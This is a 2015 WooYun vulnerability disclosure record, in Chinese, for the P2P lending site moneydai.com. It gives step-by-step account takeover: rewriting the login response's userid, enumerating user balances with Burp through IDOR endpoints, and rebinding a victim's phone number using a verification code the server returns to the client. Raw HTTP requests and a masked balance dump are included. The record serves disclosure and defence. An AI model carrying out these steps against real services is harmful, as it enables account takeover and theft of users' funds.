{"id": 11656, "wybug_id": "wooyun-2015-0132061", "wybug_title": "p2p之钱袋网任意用户登录+多处平行越权(影响全站用户)", "wybug_corp": "深圳感融互联网金融服务有限公司", "wybug_author": "路人甲", "wybug_date": "2015-08-06 12:06", "wybug_open_date": "2015-09-20 17:26", "wybug_type": "设计缺陷/逻辑错误", "wybug_level": "高", "wybug_rank_0": "17", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["设计错误"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-08-06：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-08-06：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-08-16：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-08-26：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-09-05：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-09-20：\t细节向公众公开  简要描述： 任意用户登陆+越权/ 详细说明：  首先是任意用户登录！正常登录\n\n随便填入用户名，密码。抓包！\n\n拦截response，将其改为\nHTTP/1.1 200 OKServer: nginxDate: Thu, 06 Aug 2015 01:25:39 GMTContent-Type: text/html; charset=utf-8Content-Length: 109Connection: keep-aliveX-Powered-By-360WZB: wangzhan.360.cnX-Powered-By: PHP/5.3.3Expires: Thu, 19 Nov 1981 08:52:00 GMTCache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0Pragma: no-cacheVary: Accept-Encoding,User-Agent{\"start\":\"1\",\"userid\":\"11862\",\"username\":\"15145425563\",\"user\":\"15145425623\",\"ms\":\"\\u767b\\u5f55\\u6210\\u529f!\"}\n通过更改userid实现任意用户登陆！\n\n\n\n\n\n上面是别人的账户！这么早合适才能碰到土豪！找到个接口，可直接找出可用余额！\nPOST /App/User/getUserAll?userid=11122 HTTP/1.1Cookie: PHPSESSID=8883l287fb42agledp0qde4cs1appverify: md5=e599a8f42de7027202c62323269ff361;ts=1438829010865Charset: UTF-8Content-Type: application/jsonUser-Agent: Mozilla/5.0 (Linux; U; Mobile; Android 4.4.2;MX4 Build/FRF91 )Accept: */*Connection: closeAccept-Encoding: gzip, deflateContent-Length: 0Host: www.moneydai.com\nburp跑下土豪！\n\n\n\nmask 区域\n*****\t9.92\t9.**********\t9.92\t9.**********\t9.92\t9.**********\t9.92\t9.**********\t9.92\t9.**********\t9.92\t9.**********\t9.92\t9.**********\t9.92\t9.**********\t9.92\t9.**********\t9.92\t9.**********\t9.92\t9.**********\t9.92\t9.**********\t9.92\t9.**********\t9.92\t9.**********\t9.92\t9.**********\t9.92\t9.**********5.39\t1000.**********\t8.94\t8.**********\t8.88\t8.**********\t8.84\t8.**********\t7.56\t0.**********43.45\t168.**********\t6.45\t6.**********872.40\t0.0**********242.34\t19**********45.01\t20.0**********14.70\t207**********00.00\t5000**********\t5.88\t5.**********8660.00\t0**********92.34\t157.**********\t4.96\t4.**********\t4.96\t4.**********\t4.96\t4.**********\t4.96\t4.**********\t37.63\t3**********14.88\t14.8**********\t35.42\t3**********\t34.88\t3**********3780.00\t0**********14.88\t214**********11.96\t0.9**********\t208.91\t**********\t2.38\t2.**********\t2.37\t2.**********\t2.00\t2.**********\t15.88\t1**********\t14.97\t1**********\t14.97\t1**********\t14.88\t1**********\t14.88\t1**********\t14.88\t1**********\t14.88\t1**********\t14.88\t1**********\t14.88\t1**********\t14.88\t1**********\t14.88\t1**********\t14.88\t1**********\t14.88\t1**********\t14.88\t1**********\t14.88\t1**********\t14.88\t1**********\t14.88\t1**********\t14.88\t1**********\t14.88\t1**********\t14.88\t1**********\t14.88\t1**********\t14.88\t1**********\t14.88\t1**********\t14.88\t1**********\t14.88\t1**********\t14.88\t1**********\t14.88\t1**********\t14.88\t1**********\t14.88\t1**********\t14.88\t1**********\t14.88\t1**********\t14.88\t1**********\t14.88\t1**********\t14.88\t1**********\t14.88\t1**********\t14.88\t1**********\t14.88\t1**********\t14.88\t1**********\t14.88\t1**********\t14.88\t1**********\t14.88\t1**********\t14.88\t1**********\t14.88\t1**********\t14.88\t1**********\t14.88\t1**********\t14.88\t1**********\t14.88\t1**********\t14.88\t1**********\t14.88\t1**********\t14.88\t1**********\t14.88\t1**********\t14.88\t1**********\t14.88\t1**********\t14.88\t1**********\t14.88\t1**********\t14.88\t1**********\t14.88\t1**********\t14.88\t1**********\t14.88\t1**********\t14.88\t1**********\t14.88\t1**********\t14.88\t1**********\t14.88\t1**********\t14.88\t1**********\t14.88\t1**********\t14.88\t1**********\t14.88\t1**********\t14.88\t1**********\t14.88\t1**********\t14.88\t1**********\t14.88\t1**********\t14.88\t1**********\t14.88\t1**********\t14.88\t1**********\t14.88\t1**********\t14.88\t1**********\t14.88\t1**********\t14.88\t1**********\t14.88\t1**********\t14.88\t1**********\t14.88\t1**********\t14.88\t1**********\t14.88\t1**********\t14.88\t1**********\t14.88\t1**********\t14.88\t1**********\t14.88\t1**********\t14.88\t1**********\t14.88\t1**********\t14.88\t1**********\t14.88\t1**********\t14.88\t1**********\t14.88\t1**********\t14.88\t1**********\t14.88\t1**********\t14.88\t1**********\t14.88\t1**********\t14.88\t1**********\t14.88\t1**********\t14.88\t1**********\t14.88\t1**********\t14.88\t1**********\t14.88\t1**********\t14.88\t1**********\t14.88\t1**********\t14.88\t1**********\t14.88\t1**********\t14.88\t1**********\t14.88\t1**********\t14.88\t1**********\t14.88\t1**********\t14.88\t1**********\t14.88\t1**********\t14.88\t1**********\t14.88\t1**********\t14.88\t1**********\t14.88\t1**********\t14.88\t1**********\t14.88\t1**********\t14.88\t1**********\t14.88\t1**********\t14.88\t1**********\t14.88\t1**********\t14.88\t1**********\t14.88\t1**********\t14.88\t1**********\t14.88\t1**********\t14.88\t1**********\t14.88\t1**********\t14.88\t1**********\t14.88\t1**********\t14.88\t1**********\t14.88\t1**********\t14.88\t1*****\n\n选择一个土豪登陆下\n\n就这个5w的土豪\n\n\n\n\n\n=====================================\n在测试的时候还发现，登陆上去之后，可“绕过”验证码绑定另一个手机号！\n=====================================\n\n这个还是那个土豪的，手机号被我绑定了另外一个！具体实现方法就是填入你要绑定的手机号。发送验证码（给原来手机），会在本地返回验证码，并且自动填写到输入框，从而直接绑定成功！（这是社么设计？）基本上app所有接口都可以通过userid越权\n这是另外一处接口，其他自测，反正没有很多都可以越权======================POST /App/User/myhome?userid=11862 HTTP/1.1Cookie: PHPSESSID=upfcei7sf7i7oc1l0fv5krvgs3appverify: md5=c183eafe4a4acc98c7c0749110ea27b2;ts=1438831653244Charset: UTF-8Content-Type: application/jsonUser-Agent: Mozilla/5.0 (Linux; U; Mobile; Android 4.4.2;MX4 Build/FRF91 )Accept: */*Connection: Keep-AliveAccept-Encoding: gzip, deflateContent-Length: 0Host: www.moneydai.com============================\n   漏洞证明：     修复方案：     版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：10  确认时间：2015-08-06 17:24 厂商回复： 多谢提供漏洞，正在修复中！~ 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2015-09-21 09:25 |    \t\thack_lan \t\t\t( 路人 |\t\t\t        Rank:4 漏洞数:3        | 爱好linux开源架构，安全，python)\t\t \n  这种基金也敢存钱 我也是醉了，话说业内金融那个最安全？    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 10, "Ranks": null}